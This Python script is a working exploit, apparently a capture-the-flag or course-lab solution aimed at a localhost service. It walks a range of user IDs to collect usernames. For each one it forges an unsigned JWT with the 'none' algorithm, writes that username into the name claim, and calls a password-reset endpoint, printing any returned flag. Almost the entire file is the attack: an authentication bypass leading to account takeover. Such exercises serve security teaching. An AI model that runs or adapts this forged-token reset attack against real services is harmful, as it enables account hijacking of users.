import jwt
import requests


token = "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9uYW1laWRlbnRpZmllciI6IjkwNDIwOTU2NSIsImh0dHA6Ly9zY2hlbWFzLnhtbHNvYXAub3JnL3dzLzIwMDUvMDUvaWRlbnRpdHkvY2xhaW1zL25hbWUiOiI8dXNlcm5hbWU-IiwiZXhwIjozNzg2OTEyMDAwfQ."

endpoint_url = 'http://localhost:8080/0d80dcca/profiles/reset-password'

headers = {
    "Content-Type": "application/json",
    "GATECH_ID": "904209565",
}

payload = {
    "Bearer_token": token,
}


for user_id in range(46835192, 46839729):

    response_userid = requests.get(
        f"http://localhost:8080/0d80dcca/profiles/{user_id}",
        headers=headers
    )

    if response_userid.status_code == 200:
        data = response_userid.json()
        username = data["username"]

        unverified_payload = jwt.decode(
            token,
            options={"verify_signature": False}
        )

        unverified_payload[
            'http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name'
        ] = username

        encoded_payload = jwt.encode(
            unverified_payload,
            key=None,
            algorithm="none"
        )

        headers["Authorization"] = f"Bearer {encoded_payload}"

        response_resetpass = requests.post(
            endpoint_url,
            params={"password": "Does_not_matter"},
            headers=headers,
            timeout=10


)

        print(response_resetpass.status_code)
        print(response_resetpass.text)
        if response_resetpass.status_code == 200:
            try:
                data = response_resetpass.json()
                print("Message:", data.get("message"))
                print("Flag:", data.get("flag"))
            except ValueError:
                print(response_resetpass.text)